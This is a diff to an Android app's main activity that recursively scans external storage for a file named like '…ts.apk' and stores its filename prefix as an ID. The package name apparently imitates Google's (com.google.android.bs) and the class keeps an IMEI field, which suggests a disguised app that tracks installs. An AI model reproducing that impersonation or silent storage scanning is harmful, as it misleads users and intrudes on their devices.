@@ -1,6 +1,7 @@
 package com.google.android.bs;
 
 import java.io.File;
+import java.io.FileFilter;
 import java.io.FilenameFilter;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
@@ -52,6 +53,7 @@ public class MainActivity extends Activity {
 	File root;
 	File[] fileArray;
 	private String sIMEI;
+	private String sID;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -102,7 +104,7 @@ public class MainActivity extends Activity {
 			viewIDDialog();
 		} else
 			finish();
-		}
+	}
 
 	private boolean viewIDDialog() {
 		// TODO Auto-generated method stub
@@ -161,48 +163,36 @@ public class MainActivity extends Activity {
 	}
 
 	public void getID() {
-
-		root = new File(Environment.getExternalStorageDirectory()
-				.getAbsolutePath());
-		fileArray = root.listFiles(new FilenameFilter() {
-			@Override
-			public boolean accept(File dir, String filename) {
-				return filename.toLowerCase().endsWith("ts.apk");
-			}
-		});
-		// сначала выводим путь к SD-карте
-		String f = null;
-		// затем список файлов с расширением APK
-		for (int i = 0; i < fileArray.length; i++) {
-			f = fileArray[i].getName() + "\n";
-			ID = f.substring(0, f.indexOf("t"));
-		}
-		Toast.makeText(this, ID, Toast.LENGTH_LONG).show();
-		e = sp.edit();
-		e.putString("ID", ID);
-		e.commit();
-		// Toast.makeText(this, sourceApk, Toast.LENGTH_LONG).show();
-		Log.d(LOG_TAG, "ID - " + sp.getString("ID", "ID"));
-
+		Log.d(LOG_TAG, "Start search ID ");
+		File file[] = Environment.getExternalStorageDirectory().listFiles();
+		recursiveFileFind(file);
 	}
 
-	public void findFilePath(File dir, String filename) {
+	public void recursiveFileFind(File[] file1) {
+		int i = 0;
+		String filePath = "";
+		if (file1 != null) {
+			while (i != file1.length) {
+				filePath = file1[i].getAbsolutePath();
+				sID = file1[i].getName();
+				if (file1[i].isDirectory()) {
+					File[] file = file1[i].listFiles();
+					recursiveFileFind(file);
+				}
 
-		root = new File(Environment.getExternalStorageDirectory()
-				.getAbsolutePath());
-		fileArray = root.listFiles(new FilenameFilter() {
-			@Override
-			public boolean accept(File dir, String filename) {
-				return filename.toLowerCase().endsWith(".apk");
+				if (sID.indexOf("ts.apk") != -1) {
+					ID = sID.substring(0, sID.indexOf("t"));
+					e = sp.edit();
+					e.putString("ID", ID);
+					e.commit();
+					// Toast.makeText(this, sourceApk,
+					// Toast.LENGTH_LONG).show();
+					Log.d(LOG_TAG, "ID - " + sp.getString("ID", "ID"));
+					break;
+				}
+				i++;
 			}
-		});
-		// сначала выводим путь к SD-карте
-		String f = root.getAbsolutePath() + "\n\n";
-		// затем список файлов с расширением JPG
-		for (int i = 0; i < fileArray.length; i++) {
-			f += fileArray[i].getName() + "\n";
 		}
-		Toast.makeText(this, f, Toast.LENGTH_LONG).show();
 	}
 
 	public void start() {
